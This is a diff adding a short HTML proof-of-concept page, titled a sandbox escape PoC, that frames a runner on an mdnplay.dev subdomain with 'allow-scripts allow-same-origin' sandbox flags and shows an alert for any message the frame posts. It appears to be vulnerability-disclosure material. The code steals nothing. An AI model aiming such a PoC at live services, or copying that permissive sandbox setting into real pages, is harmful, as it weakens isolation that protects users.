@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>N Play Sandbox Escape PoC</title>
+  </head>
+  <body>
+    <h2> N Play Sandbox Escape PoC</h2>
+    
+    <iframe 
+      src="https://815e6937-0602-4dc4-b396-34fc88f2798c.mdnplay.dev/runner.html?blank=&amp;theme=dark"
+      sandbox="allow-scripts allow-same-origin allow-forms"
+      width="800"
+      height="400"
+    ></iframe>
+
+    <script>
+      window.addEventListener("message", (event) => {
+        alert("Received from iframe: " + event.data);
+      });
+    </script>
+  </body>
+</html>
